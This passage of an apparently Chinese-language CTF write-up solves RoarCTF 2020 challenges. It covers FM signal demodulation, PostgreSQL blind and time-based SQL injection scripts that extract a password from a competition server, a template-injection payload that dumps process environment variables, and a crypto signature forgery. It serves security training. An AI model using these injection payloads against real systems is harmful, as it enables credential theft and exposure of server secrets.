VsfdRDi4iIiEjXQauHLmProx5aRERERLoOek09dDgeG7B/QuqhRUREROQcoV+dr4cOLxcGlFK8eqY5e+juREf/bSchZQP2R+qhRURERBbU92rz9ND2/IPbOV49pTA1Tw9tk+OAEhcjcSOnHlpERERkQaFPK+qhrQp7Al8PzZXPTBWm1vw9NMyHh5F6aBEREZEFhSbt/h46TLMB+015D20GnyTfWTgnDHhoI84ZpB5aRERERM4RmrR7eugwJw6ojuqhg/RJ4vbgTnhINmCbmKqHtoeDI06Ic9I9HMyHh5F6aBEREZEFhSaN9dBhAox0gqOHNvFJwhOGkVfjwzjinliNBnfm9D20iIiIiJwjNGkne+hQHRxxTnkPnabidrozgp35nMH44FPl1EOLiIiIyDlCkzbcQ4cSGbElLe+h4xjcD3NsDM5J98SHcY+NdGdOPbSIiIiInCM0aff/mUKivIdeicV76LDTBuwPYilu5NRDi4iIiCwo9GnqoYvY+pT30N26Ho28FPeAvnx6gnpoERERkQX1vZp66BK2PmO/h65EPbSIiIjIgroOWj10GVsf9dAiIiIi0nXQSQ9t/eUeBrSkhWx91EOLiIiISNdBJz20Bh/WvK5BfzQaGhoaGhoaGhoLjtBDf+3tS9Pv0tDQ0NDQ0NDQ0NA4Nd544/8BXEA9Otr35PYAAAAASUVORK5CYII=" alt=""></p> <p>flag：<code>flag{25c21b0d-6a11-4312-971b-428d01cdc534}</code></p> <h2 id="fm"><a href="#fm" class="header-anchor">#</a> FM</h2> <p>有了前一道题处理hackrf信号数据的经验，尝试继续用audacity观察波形。注意到文件中数据每4字节具有一定规律，可以解出0~1区间的32位浮点数：</p> <p><img src="/assets/img/roarctf2020_fm_1.961f2d63.png" alt=""></p> <p>由文件扩展名可知这些是I/Q调制的数据，可以视为复数，实部和虚部交替存储。由此可知audacity导入选项（采样率由文件名知为2MHz，但是受audacity支持所限，视为200kHz，后续所有频率表述不受此影响）：</p> <p><img src="/assets/img/roarctf2020_fm_2.a18346c7.png" alt=""></p> <p>作频谱图可以容易的识别出信号的中心频率（为48kHz左右），证实了上图中的各数据属性：</p> <p><img src="/assets/img/roarctf2020_fm_3.f7d21926.png" alt=""></p> <p>对信号进行<a href="https://blog.csdn.net/balee11/article/details/75450877" target="_blank" rel="noopener noreferrer">FM解调<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
y <span class="token operator">=</span> np<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">'fm-sample-rate-2MHz.iq'</span><span class="token punctuation">,</span> dtype <span class="token operator">=</span> np<span class="token punctuation">.</span>complex64<span class="token punctuation">)</span>
re1 <span class="token operator">=</span> y<span class="token punctuation">.</span>real<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
re2 <span class="token operator">=</span> y<span class="token punctuation">.</span>real<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
im1 <span class="token operator">=</span> y<span class="token punctuation">.</span>imag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
im2 <span class="token operator">=</span> y<span class="token punctuation">.</span>imag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
y_demod <span class="token operator">=</span> im2 <span class="token operator">*</span> re1 <span class="token operator">-</span> im1 <span class="token operator">*</span> re2
y_demod <span class="token operator">=</span> y_demod <span class="token operator">/</span> np<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>y_demod<span class="token punctuation">)</span><span class="token punctuation">)</span>
y_demod<span class="token punctuation">.</span>tofile<span class="token punctuation">(</span><span class="token string">'out2.bin'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>输出数据格式为单通道32位浮点数，采样率2MHz。作频谱图，除去噪声基底外，信号主要集中在48kHz频段上，由<a href="https://en.wikipedia.org/wiki/File:RDS_vs_DirectBand_FM-spectrum2.svg" target="_blank" rel="noopener noreferrer">FM频段分布图<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>知这是立体声信号的右声道部分：</p> <p><img src="/assets/img/roarctf2020_fm_4.6fe7a53a.png" alt=""></p> <p>进行降采样，将上述信号的采样率降低10倍（200kHz），转换为可以处理和收听的音频信号：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> scipy<span class="token punctuation">.</span>signal
y <span class="token operator">=</span> np<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span><span class="token string">'out2.bin'</span><span class="token punctuation">,</span> dtype <span class="token operator">=</span> np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
y_dec <span class="token operator">=</span> scipy<span class="token punctuation">.</span>signal<span class="token punctuation">.</span>decimate<span class="token punctuation">(</span>y<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> ftype <span class="token operator">=</span> <span class="token string">'fir'</span><span class="token punctuation">)</span>
y_dec<span class="token punctuation">.</span>tofile<span class="token punctuation">(</span><span class="token string">'out2-dec.bin'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>上述过程同时进行了低通滤波，过滤掉了噪声。也可以使用audacity的Change Speed功能实现降采样过程，设置Speed Multiplier为10.000即可。最终得到原始音频信号如下，由语音内容得到flag：</p> <p><img src="/assets/img/roarctf2020_fm_5.23a681b5.png" alt=""></p> <p>flag：<code>flag{82c83416-dadc-4947-80df-b84852b8f35d}</code></p> <h2 id="你能登录成功吗"><a href="#你能登录成功吗" class="header-anchor">#</a> 你能登录成功吗</h2> <p>一个登录界面，题目描述登录成功就有flag，页面里提示是postgresql数据库。password字段存在注入，经过一番测试之后发现：</p> <ol><li>不管是否登录成功，都会返回密码或用户名错误</li> <li>如果sql不报错，会将sql语句原样打印出来</li> <li>如果sql报错，则不会打印sql语句</li></ol> <p>构造一个bool盲注查询，通过让<code>pow()</code>函数异常和不异常来区分返回结果</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">or</span><span class="token comment">/**/</span>pow<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">case</span><span class="token comment">/**/</span><span class="token keyword">when</span><span class="token comment">/**/</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>password<span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span>{}<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'{}'</span><span class="token comment">/**/</span><span class="token keyword">then</span><span class="token comment">/**/</span><span class="token number">999</span><span class="token comment">/**/</span><span class="token keyword">end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'1'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>盲注脚本</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests

chars <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-'</span>
ans <span class="token operator">=</span> <span class="token string">''</span>
j <span class="token operator">=</span> <span class="token number">0</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">&quot;qwer'or/**/pow(9,(case/**/when/**/substr((select/**/password/**/from/**/users),{},1)='{}'/**/then/**/999/**/end))='1&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>ch<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>
        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://139.129.98.9:30005'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;qwer&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> ch
            <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="你能登录成功吗-revenge"><a href="#你能登录成功吗-revenge" class="header-anchor">#</a> 你能登录成功吗-Revenge</h2> <p>在<code>你能登录成功吗</code>的基础上，去掉了bool盲注的区分标志，但是可以通过延时来判断</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>  <span class="token operator">and</span><span class="token comment">/**/</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>password<span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span>{}<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'{}'</span><span class="token comment">/**/</span><span class="token operator">and</span><span class="token comment">/**/</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token comment">/**/</span><span class="token number">7563</span><span class="token comment">/**/</span><span class="token keyword">FROM</span><span class="token comment">/**/</span>PG_SLEEP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里有一个坑就是，postgresql的比较是区分类型的，不能使用<code>or PG_SLEEP(1)=1</code>这种语句，所以只能把它放在from里，再select出一个数据。</p> <p>盲注脚本</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

chars <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-'</span>
ans <span class="token operator">=</span> <span class="token string">''</span>
j <span class="token operator">=</span> <span class="token number">0</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">&quot;qwer1'and/**/(substr((select/**/password/**/from/**/users),{},1)='{}'/**/and/**/(SELECT/**/7563/**/FROM/**/PG_SLEEP(1))=1)and'1'='1&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>ch<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>
        t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://139.129.98.9:30007'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
        t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>t2 <span class="token operator">-</span> t1 <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> ch
            <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="html在线代码编辑器"><a href="#html在线代码编辑器" class="header-anchor">#</a> HTML在线代码编辑器</h2> <p>比赛结束之后环境没了，只能靠回忆写= =</p> <p>页面有一个写html的功能，和一个渲染html的功能。在渲染功能那里是一个<code>file=</code>，第一反应是任意文件读，但是失败了，他加了过滤。后来加一个不存在的文件试了一下，发现后面是个nodejs，貌似还是一个模板引擎，考虑一下模板注入。</p> <p>发现了一个上传功能，随手试了一下<code>5</code>，但是原样回显了，看了一下url，发现是直接访问的tmp目录里的问题，然后就想到了刚才那个模板引擎，扔进去一试，5出来了，大喜。</p> <p>题目描述说flag在环境变量里，所以就构造js语句把所有的环境变量都打出来</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>回显</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>12.20.0,86e7395b2b1b,1.22.5,/root,/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,6bc87220adada7c3629ab933ad12433c,flag{8e1a4c4f-fc41-4d6b-8f17-d5a05e30dd36},/usr/local/app
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="crypto-system"><a href="#crypto-system" class="header-anchor">#</a> Crypto_System</h2> <p>nc连接，首先出现验证，</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>sha256(XXXX+L1ZyTwlYvXDaijzA) == fd8774478154f94f6199b4bad523a39a22279cb587967a4331df97988535b5cb
Give me XXXX:
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>简单的爆破可以得出XXXX</p> <p>爆破脚本exp:</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> gmpy2
<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span>buf2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dest<span class="token operator">=</span><span class="token string">&quot;0000&quot;</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dest<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span>dest<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
                <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    dest<span class="token operator">=</span>dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
                    s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    s<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>dest<span class="token operator">+</span>buf1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
                    <span class="token comment"># print(dest)</span>
                    <span class="token keyword">if</span> s<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>buf2<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;success&quot;</span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> 
calc<span class="token punctuation">(</span><span class="token string">&quot;L1ZyTwlYvXDaijzA&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;fd8774478154f94f6199b4bad523a39a22279cb587967a4331df97988535b5cb&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>验证通过，正式进入题目。
题目给出m1,m2,r1
要求输入输入r2,s2通过验证</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token punctuation">,</span> h<span class="token punctuation">,</span> b <span class="token operator">=</span> get_parameter<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">*</span> powmod<span class="token punctuation">(</span>h<span class="token punctuation">,</span> r<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token comment"># Give me the (r2,s2)</span>
<span class="token keyword">if</span> r2 <span class="token operator">!=</span> r1 <span class="token keyword">and</span> s2 <span class="token operator">==</span> s1 <span class="token keyword">and</span> verify<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Congratulation!Here is your flag: %s&quot;</span> <span class="token operator">%</span> flag<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>其中，</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">int2str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&quot;big&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">&quot;little&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> _<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">&quot;big&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> _<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_parameter</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> int2str<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
    y <span class="token operator">=</span> powmod<span class="token punctuation">(</span>g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    a <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">&quot;\0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    b <span class="token operator">=</span> powmod<span class="token punctuation">(</span>a<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    h <span class="token operator">=</span> powmod<span class="token punctuation">(</span>g<span class="token punctuation">,</span> b<span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    <span class="token keyword">return</span> y<span class="token punctuation">,</span> h<span class="token punctuation">,</span> b

<span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token punctuation">,</span> h<span class="token punctuation">,</span> b <span class="token operator">=</span> get_parameter<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    r <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">*</span> powmod<span class="token punctuation">(</span>h<span class="token punctuation">,</span> r<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> p 

    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>若$s1=s2$
$$y1 \times {h1}^{r1} \equiv y2 \times {h2}^{r2} (mod \ p)$$
$$g^{x1+b1 \cdot r1} \equiv g^{x2+b2 \cdot r2} (mod \ p) $$
$$x1+b1 \cdot r1 \equiv x2+b2 \cdot r2 (mod \ {p-1)}$$</p> <p>其中x1,b1,r1,x2,b2,p-1均已知，则变成关于r2的一次同余式子，则可根据公式求解r2</p> <p>完整exp：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> <span class="token number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span>
g <span class="token operator">=</span> <span class="token number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span>
<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span>buf2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dest<span class="token operator">=</span><span class="token string">&quot;0000&quot;</span>
